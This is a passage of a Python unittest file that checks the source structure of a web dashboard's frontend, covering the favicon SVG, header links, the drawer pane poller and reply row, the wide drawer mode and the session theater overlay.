        # own file. Two files publishing the same name would mean one
        # silently overwrites the other depending on load order.
        published = {}
        for name in FRONTEND_FILES:
            js = self.files[name]
            marker = "  // Seam: what the other files reach for through window.Centrale.\n"
            if marker not in js:
                continue
            block = js[js.index(marker):].split("\n")
            lines = []
            for line in block[3:]:          # skip the marker's own comment box
                if line.startswith("  C."):
                    lines.append(line)
                elif lines:
                    break                   # the block ends at its first gap
            self.assertTrue(lines, name)
            for line in lines:
                m = re.fullmatch(r"  C\.(\w+) = (\w+);", line)
                self.assertIsNotNone(m, line)
                self.assertEqual(m.group(1), m.group(2), line)
                exported = m.group(1)
                self.assertNotIn(exported, published,
                                 "%s published by both %s and %s"
                                 % (exported, published.get(exported), name))
                published[exported] = name
                # ...and it really is declared in that same file.
                self.assertRegex(
                    js, r"(?m)^  (?:var|let|const|function) %s\b" % exported)
        self.assertGreater(len(published), 50)

    def test_reassigned_shared_state_lives_on_the_namespace_object(self):
        # Rule 1 of the seam (see static/state.js): a shared value that
        # gets reassigned is assigned onto C, never declared with var --
        # a local plus a published alias would go stale the moment
        # another file assigned to it. state.js holds all but one of
        # them; settings.js keeps its own open flag there for the same
        # reason (pane.js reads it).
        for owned in ("boardData", "sessionsData", "activeProjects", "currentDrawer",
                      "readyOnly", "searchText", "sessionPreviewMode", "drawerWide",
                      "refreshIntervalSeconds", "lastBoardError", "firstLoadDone"):
            with self.subTest(owned):
                self.assertIn("  C.%s = " % owned, self.files["state.js"])
                for name in FRONTEND_FILES:
                    self.assertNotRegex(
                        self.files[name],
                        r"(?m)^  (?:var|let|const) %s\b" % owned)
        self.assertIn("  C.settingsOpen = false;", self.files["settings.js"])

    def test_the_boot_call_lives_at_the_bottom_of_main_js_alone(self):
        # The call that used to run at the bottom of the inline block is
        # still the last statement of the last file loaded. Only the
        # top-level one counts: the merge/cleanup paths call
        # C.doRefresh(true) from inside their own handlers.
        self.assertTrue(
            self.files["main.js"].rstrip().endswith(
                "  C.doRefresh(true);\n" + IIFE_CLOSE))
        for name in FRONTEND_FILES:
            boots = re.findall(r"(?m)^  C\.doRefresh\(true\);$", self.files[name])
            self.assertEqual(len(boots), 1 if name == "main.js" else 0, name)


class FaviconContractTests(unittest.TestCase):
    """Task-90: the tab icon is a committed SVG under static/, declared by
    one <link> in index.html. Before this the shell declared nothing, so
    browsers guessed at /favicon.ico and every page load logged a 404 --
    the only console error in an otherwise clean run."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.svg = load_static("favicon.svg")

    def test_index_html_declares_the_icon_once_from_the_head(self):
        self.assertEqual(self.html.count(FAVICON_LINK), 1)
        self.assertEqual(self.html.count('rel="icon"'), 1)
        self.assertLess(self.html.index(FAVICON_LINK), self.html.index("</head>"))

    def test_icon_link_does_not_displace_the_pre_paint_theme_bootstrap(self):
        # The bootstrap has to be the first thing in <head> that runs; the
        # icon link is inert markup and sits after it.
        self.assertLess(
            self.html.index("window.CentraleTheme = {"), self.html.index(FAVICON_LINK)
        )

    def test_favicon_is_a_plain_committed_svg_with_no_external_reference(self):
        # No build step, no CDN, no binary blob: the whole icon is hand
        # written markup the static route can serve straight off disk.
        self.assertTrue(self.svg.lstrip().startswith("<svg"))
        self.assertIn('xmlns="http://www.w3.org/2000/svg"', self.svg)
        self.assertIn('viewBox="0 0 32 32"', self.svg)
        for forbidden in ("http://", "https://", "<image", "<script", "url("):
            haystack = self.svg.replace('xmlns="http://www.w3.org/2000/svg"', "")
            self.assertNotIn(forbidden, haystack, forbidden)
        xml.dom.minidom.parseString(self.svg)  # well-formed, or this raises

    def test_icon_paints_its_own_background_so_both_chromes_work(self):
        # AC #4: legibility must not depend on the tab strip's colour, so
        # the glyph sits on an opaque tile of its own rather than being
        # bare marks that vanish into a matching chrome.
        doc = xml.dom.minidom.parseString(self.svg)
        rect = doc.getElementsByTagName("rect")[0]
        # An opaque tile filling the whole viewBox, in the accent colour
        # the sidebar brand dot uses.
        self.assertEqual(rect.getAttribute("width"), "32")
        self.assertEqual(rect.getAttribute("height"), "32")
        self.assertEqual(rect.getAttribute("fill").lower(), "#2563eb")
        self.assertNotIn("fill-opacity", self.svg)
        # The glyph is drawn in white on top of that tile.
        path = doc.getElementsByTagName("path")[0]
        self.assertEqual(path.getAttribute("stroke").lower(), "#ffffff")


class AgentBadgeSessionScopeTests(unittest.TestCase):
    """What is left of task-78 once the badge itself is driven.

    The states a dead session's badge must be suppressed for, and the
    ones that survive it, are read off the rendered drawer in
    tests/test_frontend_behaviour.py
    (AgentBadgeSessionScopeBehaviourTests) -- a driven test can render
    every state it can name and say what each one produces.

    What it cannot say is that nothing ELSE suppresses a badge. That is
    a claim about the gate rather than about a state: the whole rule is
    one early return, so a second `return null` added anywhere in the
    function would be a second, unexamined way for a badge to vanish
    with no test naming it. Counting them is a read of the source, and
    stays one.
    """

    @classmethod
    def setUpClass(cls):
        # task-89: the badge gate lives in tasks.js.
        cls.effective_body = region(
            load_static("tasks.js"),
            "function effectiveAgentState(", "function renderAgentBadge(",
            invariant="the badge's session-scoped state gate")

    def test_the_suppression_gate_is_the_functions_only_null_return(self):
        self.assertIn("if (!live && SESSION_SCOPED_AGENT_STATES[state]) return null",
                      self.effective_body)
        self.assertEqual(self.effective_body.count("return null"), 1)


class VersionCreditContractTests(unittest.TestCase):
    """Task-107: the version sits in the sidebar footer beside the
    Settings gear, as a credit rather than a control.

    Source SHAPE only -- the element the shell declares and how it is
    styled. What it actually shows, and when, is a behavioural claim and
    lives in tests/test_frontend_behaviour.py (task-108)."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")

    def test_the_shell_declares_the_credit_once_inside_the_footer(self):
        self.assertEqual(self.html.count('id="version"'), 1)
        footer = self.html[self.html.index('id="sidebar-footer"'):]
        footer = footer[:footer.index("</aside>")]
        self.assertIn('<span id="version"></span>', footer)

    def test_the_credit_is_grouped_with_the_gear_not_with_the_refresh_row(self):
        # #sidebar-footer is `justify-content: space-between`, so a third
        # top-level child would be centred between the two ends rather
        # than sitting beside the gear. The two share one flex child
        # instead.
        credit = self.html[self.html.index('id="footer-credit"'):]
        credit = credit[:credit.index("</div>")]
        self.assertIn('id="version"', credit)
        self.assertIn('id="settings-open"', credit)
        refresh = self.html[self.html.index('id="refresh-area"'):]
        self.assertNotIn('id="version"', refresh[:refresh.index("</div>")])

    def test_it_is_styled_as_a_quiet_credit_and_not_as_a_control(self):
        rule = self.css[self.css.index("  #version {"):]
        rule = rule[:rule.index("}")]
        # Faint, like the refresh status across the footer -- and none of
        # the affordances of the gear beside it.
        self.assertIn("color: var(--text-faint)", rule)
        for forbidden in ("border", "cursor", "background"):
            self.assertNotIn(forbidden, rule, forbidden)
        # A long describe string ("v0.1.0-14-g4570911-dirty") ellipsises
        # rather than wrapping, so it can never push the gear off the row.
        self.assertIn("white-space: nowrap", rule)
        self.assertIn("text-overflow: ellipsis", rule)



class HeaderLinkContractTests(unittest.TestCase):
    """Task-98: the two links in the header -- the product's own name,
    pointing at Centrale's repository, and the tagline's Backlog.md
    credit beside it.

    The tagline link shipped with no test at all, so this class is the
    first coverage of either. Source SHAPE by necessity, not by
    preference: both are inert markup in index.html styled by
    styles.css, with no JavaScript anywhere near them, so the
    behavioural tier -- which drives static/*.js under node and has
    neither a stylesheet nor the document shell -- cannot see a wrong
    URL or a missing rel. The file they live in is the only place their
    drift shows.
    """

    # Centrale's public snapshot repository -- the RELEASE_REMOTE in the
    # (untracked) .release-remote, in its browsable https form, and the
    # same URL README.md's clone command uses. Spelled out here so a typo
    # in the header fails rather than shipping a 404 on the one link
    # anyone would follow to find where the thing came from.
    REPO_URL = "https://github.com/levantlabs/centrale"

    @classmethod
    def setUpClass(cls):
        cls.css = load_static("styles.css")
        cls.h1 = region(load_static("index.html"), "<h1>", "</h1>",
                        invariant="the header title and its links")

    def test_the_name_links_to_centrales_own_repository(self):
        self.assertIn(
            '<a href="%s" target="_blank" rel="noopener noreferrer">Centrale</a>'
            % self.REPO_URL,
            self.h1,
        )

    def test_the_header_holds_exactly_two_links_both_opening_safely(self):
        # The name and the Backlog.md credit beside it -- and nothing
        # else: a third would turn the title into a row of links.
        anchors = re.findall(r"<a\b[^>]*>", str(self.h1))
        self.assertEqual(len(anchors), 2, str(self.h1))
        for anchor in anchors:
            self.assertIn('target="_blank"', anchor)
            self.assertIn('rel="noopener noreferrer"', anchor)
        self.assertIn('href="https://github.com/MrLesk/Backlog.md"', str(self.h1))

    def test_the_name_is_styled_as_the_title_and_not_as_a_control(self):
        # `>` and not a descendant selector: the tagline's credit is a
        # grandchild and keeps its own fainter rule.
        rule = region(self.css, "  #header h1 > a {", "}",
                      invariant="the header title link's styling")
        self.assertIn("color: inherit", rule)
        self.assertIn("text-decoration: none", rule)
        # Dotted at the tagline's faint colour, not at currentColor: at
        # 20px bold a dotted rule in the title's own colour reads as a
        # solid one, and the hover state then looks identical to the
        # resting one.
        self.assertIn("border-bottom: 1px dotted var(--text-faint)", rule)
        # None of the affordances of the theme toggle sharing the header.
        for forbidden in ("background", "cursor", "padding"):
            self.assertNotIn(forbidden, rule, forbidden)
        # Hover is where it goes solid and takes the text's colour, and
        # focus is visible -- the two states the tagline link has had
        # since it shipped.
        hover = region(self.css, "  #header h1 > a:hover {", "}",
                       invariant="the header title link's hover state")
        self.assertIn("border-bottom-style: solid", hover)
        self.assertIn("border-bottom-color: currentColor", hover)
        focus = region(self.css, "  #header h1 > a:focus-visible {", "}",
                       invariant="the header title link's focus ring")
        self.assertIn("outline: 2px solid var(--accent)", focus)


class ExternalWorkContractTests(unittest.TestCase):
    """What is left of task-70/task-80 once the render is driven.

    That a branch checked out outside Centrale renders as its own
    explicit state -- the badge ahead of "interrupted" and "unmerged",
    the disabled action carrying the honest reason, the card footer and
    the drawer both refusing the cleanup click -- is read off the
    rendered board and drawer in tests/test_frontend_behaviour.py
    (ExternalBranchBehaviourTests).

    What is left is the badge's CSS. The shim those tests run over has
    no stylesheet and no layout, so a rule that exists is exactly as
    invisible there as one that does not; the only place its absence
    shows is the file it lives in.
    """

    def test_badge_external_style_exists(self):
        self.assertIn(".badge-external {", load_static("styles.css"))


class ExternalMergeDisabledContractTests(unittest.TestCase):
    """What is left of task-81 once the disabled Merge is driven.

    That Merge renders disabled with the external reason as its title,
    that every other checkout kind keeps the enabled button and its
    unchanged tooltip, that the click which POSTs /api/harvest is never
    attached to the disabled one, and that the drawer re-enables it on
    the next refetch with no reload, are all read off the rendered card
    and drawer in tests/test_frontend_behaviour.py
    (ExternalBranchBehaviourTests).

    What is left is the other half of "derived from the board alone":
    that the rule reads no client state. A driven run can only show
    that the rule agreed with the board it was handed -- it cannot show
    that there is no second input somewhere that this board happened
    not to set. That is a claim about every frontend file, and only a
    read of them all can make it.
    """

    def test_the_rule_reads_the_board_summary_and_no_client_state(self):
        display = region(
            load_static("harvest.js"), "function harvestButtonDisplay(state, task)",
            "function harvestActionIsArmed(",
            invariant="the Merge button's display rule")
        # The only inputs are the in-flight harvest state and the task
        # itself; the map of remembered verdicts is not consulted.
        self.assertIn("var ext = C.externalCheckout(task)", display)
        self.assertNotIn("harvestStates", display)
        # ...and no module-level flag was introduced to carry it either,
        # in any frontend file or in the shell.
        for name in FRONTEND_FILES + ["index.html"]:
            self.assertNotIn("externalMergeDisabled", load_static(name), name)


class DrawerPanePreviewContractTests(unittest.TestCase):
    """Task-60: what is left of the drawer's live pane in SOURCE TEXT --
    the markup and CSS the pane section needs, the seam wiring that
    drives it from three files, and the fact that the fetch has exactly
    one home.

    task-108 moved the rest to tests/test_frontend_behaviour.py, where
    the cadence, the start/stop gates, the clamp and the "a render never
    touches the pane area" rule are observed by driving the real sources
    instead of grepping them: those were claims about what the poller
    DOES, and a substring is the wrong evidence for one."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")
        # task-89: the poller and the reply row are static/pane.js; the
        # lifecycle hooks that drive it are in drawer.js and main.js, and
        # the feature flag round-trip is in api.js and settings.js.
        cls.pane = load_static("pane.js")
        cls.drawer = load_static("drawer.js")
        cls.main = load_static("main.js")
        cls.api = load_static("api.js")
        cls.settings = load_static("settings.js")
        cls.poller = region(cls.pane, "var PANE_POLL_INTERVAL_MS", "function closeDrawer()",
                            invariant="the drawer's pane poller")

    def _fn(self, js, name, next_name):
        return region(js, "function " + name + "(", "function " + next_name + "(",
                      invariant="function " + name + "()")

    def test_pane_has_its_own_drawer_element(self):
        self.assertIn('<div id="drawer-pane-area"></div>', self.html)
        # The :not(:empty) divider rule the other drawer footers share.
        self.assertIn("#drawer-pane-area:not(:empty)", self.css)

    def test_the_pane_fetch_has_exactly_one_home_in_the_frontend(self):
        # Genuinely a source-shape claim, and the one the behaviour tier
        # cannot make: a driven test can only show that the flows it
        # walks fetch once, never that no OTHER file grew a second pane
        # fetch. (The "?"-suffixed form is the fetch URL; prose mentions
        # of the endpoint in comments and tooltips don't count.)
        self.assertEqual(
            sum(load_static(name).count("/api/session-pane?") for name in FRONTEND_FILES), 1)
        self.assertEqual(
            sum(load_static(name).count("PANE_POLL_INTERVAL_MS") for name in FRONTEND_FILES),
            2)  # declared once, used once (paneTickDelayMs)
        # ...and one node per pane element, so there is nothing a second
        # surface could be rendered into.
        for pane_id in ("drawer-pane-pre", "drawer-pane-age", "drawer-pane-error",
                        "drawer-pane-reply", "drawer-pane-theater-toggle"):
            self.assertEqual(
                sum(load_static(name).count('id: "%s"' % pane_id) for name in FRONTEND_FILES),
                1, pane_id)
        self.assertEqual(self.html.count('id="drawer-pane-area"'), 1)

    def test_drawer_lifecycle_hooks_and_age_label(self):
        open_fn = self._fn(self.drawer, "openDrawer", "branchTaskDiffersFromMain")
        self.assertIn("C.syncDrawerPanePolling();", open_fn)
        close_fn = function_body(self.pane, "closeDrawer")
        self.assertIn("syncDrawerPanePolling();", close_fn)
        render_all = self._fn(self.main, "renderAll", "renderBoardAndSessionsIfChanged")
        self.assertIn("C.syncDrawerPanePolling();", render_all)
        # A visible capture age so a stale capture is never mistaken for live.
        self.assertIn('id: "drawer-pane-age"', self.poller)
        # Ticked from the one-second clock in api.js.
        self.assertIn("C.updateDrawerPaneAge(); // task-60", self.api)
        self.assertIn('(stale ? " (stale)" : "")', self.poller)

    def test_feature_flag_comes_from_board_and_settings_toggle_round_trips_it(self):
        self.assertIn('if (typeof C.boardData.sessionPreviewMode === "string")', self.api)
        self.assertIn('id="settings-session-preview-toggle"', self.html)
        self.assertIn('C.byId("settings-session-preview-toggle").checked = data.sessionPreviewMode !== "off"', self.settings)
        # task-61: the save body is derived from BOTH toggles via one mapping.
        self.assertIn('sessionPreviewMode: settingsSessionPreviewModeFromToggles()', self.settings)
        self.assertIn('id="settings-error-sessionPreviewMode"', self.html)


class DrawerPaneReplyContractTests(unittest.TestCase):
    """Task-61: hermetic source-level checks of the drawer's reply row --
    same style as DrawerPanePreviewContractTests. Pins: the row lives
    inside the pane area and is written only by the poller code; it
    exists only in the "interact" tier; sending is gated on a fresh
    capture with the capture age shown next to the input; exactly one
    place POSTs the reply, and it offers exactly the text box plus the
    two task-135 session keys; the settings modal maps two toggles onto
    the one tiered knob."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")
        # task-89: the poller and the reply row are static/pane.js; the
        # starting tier is state.js and the two toggles are settings.js.
        cls.pane = load_static("pane.js")
        cls.state = load_static("state.js")
        cls.settings = load_static("settings.js")
        cls.poller = region(cls.pane, "var PANE_POLL_INTERVAL_MS", "function closeDrawer()",
                            invariant="the drawer's pane poller")
        cls.reply = region(cls.pane, "var REPLY_MAX_CAPTURE_AGE_SEC", "function closeDrawer()",
                           invariant="the drawer's pane reply row")

    def _fn(self, js, name, next_name):
        return region(js, "function " + name + "(", "function " + next_name + "(",
                      invariant="function " + name + "()")

    def test_reply_row_lives_in_the_pane_area_and_only_the_poller_writes_it(self):
        # Rendered by the pane skeleton / sync (inside the poller section)
        # and nowhere else -- so a reply can't become a board re-render.
        self.assertIn('attrs: { id: "drawer-pane-reply" }', self.reply)
        self.assertIn("syncDrawerPaneReplyRow(); // task-61",
                      self._fn(self.pane, "renderDrawerPaneSkeleton", "scheduleNextPaneTick"))
        # "Outside the poller" is the rest of pane.js plus every other
        # frontend file (task-89); the CSS and the markup may
        # legitimately name the row's ids/classes.
        js_outside = self.pane.replace(str(self.poller), "") + "".join(
            load_static(name) for name in FRONTEND_FILES if name != "pane.js")
        for marker in ("drawer-pane-reply", "sendDrawerPaneReply(", "renderDrawerPaneReplyRow("):
            self.assertNotIn(marker, js_outside, marker)
        for forbidden in ("renderBoard(", "renderAll(", "renderBoardAndSessionsIfChanged(", "renderSessionsPanel(", "renderDrawerSessionArea("):
            self.assertNotIn(forbidden, self.reply, forbidden)

    def test_the_client_and_the_server_agree_on_what_counts_as_stale(self):
        # The gate itself -- a stale capture blocking the send before a
        # POST leaves the page, and the age shown next to the input --
        # is driven in tests/test_frontend_behaviour.py. What no single
        # side can observe is that the two thresholds are the SAME ten
        # seconds: the client would otherwise offer a send the server
        # answers with a 409.
        self.assertIn("var REPLY_MAX_CAPTURE_AGE_SEC = 10;", self.reply)
        self.assertEqual(server.SESSION_INPUT_MAX_CAPTURE_AGE_SECONDS, 10)
        # ...and it ticks on the same 1s clock as the pane's age label.
        self.assertIn("updateDrawerPaneReplyGate(); // task-61",
                      self._fn(self.pane, "updateDrawerPaneAge", "syncDrawerPaneReplyRow"))

    def test_reply_row_offers_text_send_and_exactly_the_two_session_keys(self):
        self.assertEqual(
            sum(load_static(name).count('"/api/session-input"') for name in FRONTEND_FILES), 1)
        # task-99: identity moved out of the query string into the body,
        # so no frontend file may build a ?project=&task= reply URL.
        self.assertEqual(
            sum(load_static(name).count("/api/session-input?") for name in FRONTEND_FILES), 0)
        send = self._fn(self.pane, "sendDrawerPaneReply", "closeDrawer")
        self.assertIn('method: "POST"', send)
        self.assertIn("project: C.currentDrawer.project", send)
        self.assertIn("taskId: C.currentDrawer.id", send)
        self.assertIn("body.key = payload.key; else body.text = payload.text;", send)
        row = self._fn(self.pane, "renderDrawerPaneReplyRow", "drawerPaneReplyBlockReason")
        self.assertIn("sendDrawerPaneReply({ text: input.value })", row)
        self.assertIn('text: "Send"', row)
        # task-135: Send plus one button per session key, in the same form
        # row as the input -- and the key list is exactly Esc and Enter,
        # agreeing with the server's allowlist. "y" stays gone (task-77).
        keys = region(self.reply, "var REPLY_KEYS = [", "var paneReply = {",
                      invariant="the reply row's session-key list")
        self.assertEqual(
            re.findall(r'\bkey: "(\w+)"', str(keys)), ["Escape", "Enter"])
        self.assertEqual(list(server.SESSION_INPUT_KEYS), ["Escape", "Enter"])
        self.assertNotIn('"y"', keys)
        self.assertEqual(row.count('C.h("button"'), 2)  # Send + the REPLY_KEYS loop
        self.assertIn("sendDrawerPaneReply({ key: k.key })", row)
        self.assertIn("drawer-pane-reply-key", row)
        # No confirm step, warning, or capture preflight wrapped round a key.
        for editorialising in ("confirm(", "window.confirm", "areYouSure"):
            self.assertNotIn(editorialising, self.reply, editorialising)
        # A successful send pulls the next capture forward.
        self.assertIn("refreshDrawerPaneNow();", send)
        # Escape in the input never closes the drawer.
        self.assertIn("e.stopPropagation();", row)

    def test_settings_modal_maps_two_toggles_onto_the_tiered_knob(self):
        self.assertIn('id="settings-session-reply-toggle"', self.html)
        self.assertIn("Allow replying to the agent from the drawer (send text and keys)", self.html)
        self.assertIn('C.byId("settings-session-reply-toggle").checked = data.sessionPreviewMode === "interact"',
                      self.settings)
        mapping = self._fn(self.settings, "settingsSessionPreviewModeFromToggles", "syncSettingsReplyToggle")
        self.assertIn('if (!C.byId("settings-session-preview-toggle").checked) return "off";', mapping)
        self.assertIn('return C.byId("settings-session-reply-toggle").checked ? "interact" : "view";', mapping)
        # Reply toggle is moot (disabled) while the pane itself is off.
        self.assertIn("reply.disabled = !previewOn;", self.settings)


class DrawerWideModeContractTests(unittest.TestCase):
    """What is left of task-68 once the width is driven.

    The toggle's home in the pane header, its labels and pressed state,
    what one click does and does not disturb, the stored preference
    (including a store that refuses reads and writes outright) and the
    class dropping with the pane section are all observed in
    tests/test_frontend_behaviour.py (DrawerWideModeBehaviourTests).

    Two things are left. The CSS is the feature -- `max-width: 90vw`, a
    drawer that stays position:fixed so the board never reflows under
    it, and the below-880px rule that has to outrank `#drawer.wide` --
    and a shim with no layout engine cannot see any of it. And the two
    counts say there is exactly ONE toggle and exactly TWO namings of
    the storage key across every frontend file: a second toggle
    elsewhere, or a third reader of the key, would drive identically and
    still be a second source of truth.
    """

    @classmethod
    def setUpClass(cls):
        # task-89: the toggle is pane.js, the stored preference state.js,
        # the settings save path settings.js.
        cls.css = load_static("styles.css")
        cls.state = load_static("state.js")

    def test_the_toggle_and_its_key_have_one_home_each(self):
        self.assertEqual(
            sum(load_static(name).count('id: "drawer-pane-wide-toggle"')
                for name in FRONTEND_FILES), 1)
        self.assertIn('drawerWide: "centrale-drawer-wide"', self.state)
        self.assertEqual(
            sum(load_static(name).count("VIEW_STATE_KEYS.drawerWide")
                for name in FRONTEND_FILES), 2)
        # Never product config: the settings save path does not know the
        # preference exists.
        self.assertNotIn("drawerWide", function_body(load_static("settings.js"), "saveSettings"))

    def test_css_widens_the_fixed_drawer_and_keeps_the_pane_footer_shrink(self):
        self.assertIn("#drawer.wide {", self.css)
        wide_start = self.css.index("#drawer.wide {")
        wide_block = self.css[wide_start:self.css.index("}", wide_start)]
        self.assertIn("max-width: 90vw;", wide_block)
        self.assertIn("#drawer.wide .drawer-pane-pre { max-height:", self.css)
        # The drawer stays position:fixed (no board reflow) and the pane
        # footer's short-window shrink rules are untouched.
        drawer_start = self.css.index("#drawer {")
        drawer_block = self.css[drawer_start:self.css.index("}", drawer_start)]
        self.assertIn("position: fixed;", drawer_block)
        self.assertIn("#drawer-pane-area:not(:empty) > .drawer-pane-pre {", self.css)
        # Below 880px both modes are the full viewport (#drawer.wide would
        # otherwise outrank the plain #drawer rule inside the media query).
        self.assertIn("#drawer, #drawer.wide { width: 100vw; max-width: 100vw; }", self.css)


class SessionTheaterContractTests(unittest.TestCase):
    """Task-73: what the session theater is made of, in source text --
    the in-page overlay for READING/REPLYING to a live pane (the
    drawer's wide mode, task-68, stays the glance tier). Pins: the
    overlay is the settings-modal skeleton (backdrop + dialog layer,
    .open classes, role=dialog aria contract, backdrop click) and never
    a browser window; no copy of the pane is constructed anywhere; and
    the sessionPreview tiers are inherited from the pane/reply code
    rather than re-decided.

    The behaviour those greps used to stand in for -- the single-poller
    contract, the node being moved and given back, Maximize fetching
    nothing, and the Escape ladder closing one layer at a time -- is
    driven over the real sources in tests/test_frontend_behaviour.py
    since task-108."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")
        # task-89: the theater lives with the pane it moves, in pane.js;
        # only the settings half of the Escape ladder is elsewhere.
        cls.pane = load_static("pane.js")
        cls.settings = load_static("settings.js")

    def _fn(self, name, next_name):
        return region(self.pane, "function " + name + "(", "function " + next_name + "(",
                      invariant="function " + name + "()")

    def _css_block(self, selector):
        return region(self.css, selector + " {", "}",
                      invariant="the " + selector + " rule")

    def _theater_code(self):
        return region(self.pane, "var theaterOpen = false;", "function scheduleNextPaneTick(",
                      invariant="the session theater")

    def test_maximize_control_lives_in_the_pane_section_header(self):
        skeleton = self._fn("renderDrawerPaneSkeleton", "paneScrollState")
        self.assertIn('id: "drawer-pane-theater-toggle"', skeleton)
        self.assertIn("onclick: toggleTheater", skeleton)
        # Created exactly once, by the pane skeleton -- so the control exists
        # only while the pane section does (never in the "off" tier, which
        # never renders a skeleton).
        self.assertEqual(
            sum(load_static(name).count('id: "drawer-pane-theater-toggle"') for name in FRONTEND_FILES), 1)
        self.assertIn('theaterOpen ? "Close" : "Maximize"', self.pane)
        # The dialog is labelled by the pane section's own heading.
        self.assertIn('attrs: { id: "drawer-pane-title" }', skeleton)
        self.assertIn('aria-labelledby="drawer-pane-title"', self.html)

    def test_overlay_reuses_the_settings_modal_skeleton_not_a_window(self):
        self.assertIn('<div id="theater-backdrop"></div>', self.html)
        self.assertIn(
            '<div id="theater" role="dialog" aria-modal="true" aria-labelledby="drawer-pane-title" aria-hidden="true"></div>',
            self.html,
        )
        # Same skeleton as the settings modal: a fixed full-viewport backdrop
        # and a fixed, centered dialog layer, both toggled by an .open class.
        for sel in ("#settings-backdrop", "#theater-backdrop"):
            block = self._css_block(sel)
            for rule in ("position: fixed;", "inset: 0;", "background: var(--backdrop);", "pointer-events: none;"):
                self.assertIn(rule, block, sel + " " + rule)
        self.assertIn("#theater-backdrop.open { opacity: 1; pointer-events: auto; }", self.css)
        theater = self._css_block("#theater")
        for rule in ("position: fixed;", "top: 50%; left: 50%;", "width: 90vw;", "height: 85vh;", "pointer-events: none;"):
            self.assertIn(rule, theater, rule)
        self.assertIn("#theater.open { opacity: 1; pointer-events: auto; transform: translate(-50%, -50%); }", self.css)
        # Stacked above the drawer (z 50), like the settings modal is.
        self.assertIn("z-index: 70;", theater)
        self.assertIn("z-index: 60;", self._css_block("#theater-backdrop"))
        self.assertIn("z-index: 50;", self._css_block("#drawer"))
        # Wiring mirrors settings: backdrop click closes; one writer of the
        # open state (classes + aria-hidden) for dialog and backdrop.
        self.assertIn('C.byId("settings-backdrop").addEventListener("click", closeSettingsModal);', self.settings)
        self.assertIn('C.byId("theater-backdrop").addEventListener("click", closeTheater);', self.pane)
        apply_fn = self._fn("applyTheaterControls", "openTheater")
        self.assertIn('theater.classList.toggle("open", theaterOpen);', apply_fn)
        self.assertIn('C.byId("theater-backdrop").classList.toggle("open", theaterOpen);', apply_fn)
        self.assertIn('theater.setAttribute("aria-hidden", theaterOpen ? "false" : "true");', apply_fn)
        self.assertEqual(self.pane.count('"open", theaterOpen)'), 2)
        # Explicitly NOT a browser window/popup.
        self.assertNotIn("window.open(", self._theater_code())

    def test_no_copy_of_the_pane_is_ever_built(self):
        # The single-poller contract itself is driven in
        # tests/test_frontend_behaviour.py: opening Maximize moves the
        # one node, fetches nothing and arms no second timer, and closing
        # gives it back. What stays here is the source-shape half a
        # driven test cannot reach -- that no copy is CONSTRUCTED
        # anywhere, in a file the flows above may never execute.
        self.assertNotIn("cloneNode", self.pane)
        self.assertEqual(
            sum(load_static(name).count("cloneNode") for name in FRONTEND_FILES), 0)
        # ...and the theater is an in-page overlay, never a popup.
        self.assertNotIn("window.open(", self._theater_code())

    def test_tiers_are_inherited_from_the_pane_code_not_redecided(self):
        theater = self._theater_code()
        # The theater never looks at the tier or the reply row: the row is
        # the same node syncDrawerPaneReplyRow adds/removes per tier, and
        # moves with the section. Nothing to keep in sync.
        for forbidden in ("sessionPreviewMode", "replyTierEnabled", "drawer-pane-reply",
                          "renderDrawerPaneReplyRow", "syncDrawerPaneReplyRow", "sendDrawerPaneReply"):
            self.assertNotIn(forbidden, theater, forbidden)
        sync_row = self._fn("syncDrawerPaneReplyRow", "renderDrawerPaneReplyRow")
        self.assertIn('var area = C.byId("drawer-pane-area");', sync_row)
        self.assertIn("if (!replyTierEnabled()) {", sync_row)
        # One reply POST, one send path, one gate -- unchanged.
        for once in ('"/api/session-input"', "function sendDrawerPaneReply(",
                     "function drawerPaneReplyBlockReason("):
            self.assertEqual(
                sum(load_static(name).count(once) for name in FRONTEND_FILES), 1, once)

    def test_css_lets_the_capture_fill_the_theater_and_leaves_the_glance_tier_alone(self):
        pre_block = self._css_block("#theater > #drawer-pane-area:not(:empty) > .drawer-pane-pre")
        for rule in ("flex: 1 1 auto;", "max-height: none;", "min-height: 0;"):
            self.assertIn(rule, pre_block, rule)
        self.assertIn("#theater .drawer-pane-wide-toggle { display: none; }", self.css)
        # task-68 (the glance tier) is untouched.
        self.assertIn("#drawer.wide {", self.css)
        self.assertIn("max-width: 90vw;", self._css_block("#drawer.wide"))
        self.assertIn("#drawer.wide .drawer-pane-pre { max-height: 560px; }", self.css)
        self.assertIn('var wide = !!(C.drawerWide && panePoll.key && C.byId("drawer-pane-pre"))', self.pane)
        # The decorative-run clamp stays as is.
        self.assertIn("var PANE_DECOR_RUN_RE = /([─━═╌┄┈╍┅┉▔▁▀▄█\\-=_·.*#~])\\1{39,}/g;", self.pane)
        self.assertIn("var text = shown.map(clampPaneLine).join(\"\\n\");", self.pane)


class TheaterTaskRailContractTests(unittest.TestCase):
    """Task-93: hermetic source-level checks of the session theater's task
    rail -- the second column carrying the open ticket's read-only detail
    beside the terminal. Same no-browser style as
    SessionTheaterContractTests, which is left untouched: this class pins
    only what the rail adds. Pins: the rail renders from data already in
    memory and never fetches, times or touches the poll state (the
    single-poller contract); its acceptance criteria come from the agent's
    branch when there is one and say which copy is on screen; it carries
    no lifecycle action; the collapse control is the task-68 idiom with a
    fault-tolerant per-viewer localStorage key and an automatic collapse
    below a viewport threshold; and the whole thing is contained enough to
    revert -- one block in pane.js reached by exactly two call lines, one
    CSS block keyed on classes that exist only while the rail does, and no
    markup in index.html at all."""

    @classmethod
    def setUpClass(cls):
        cls.html = load_static("index.html")
        cls.css = load_static("styles.css")
        cls.pane = load_static("pane.js")
        cls.drawer = load_static("drawer.js")
        cls.state = load_static("state.js")
        cls.settings = load_static("settings.js")
        # The rail's whole home in pane.js: from its section banner to the
        # file's DOM wiring, which follows it -- trimmed back to the blank
        # line before that next section's own comment block, so only the
        # rail's source is in the slice.
        cls.rail = region(
            cls.pane, "  // task-93: the theater's task rail",
            'C.byId("drawer-open-board").addEventListener',
            invariant="the theater's task rail", trim_back_to="\n\n")

    def _fn(self, js, name, next_name):
        return region(js, "function " + name + "(", "function " + next_name + "(",
                      invariant="function " + name + "()")

    def _css_block(self, selector):
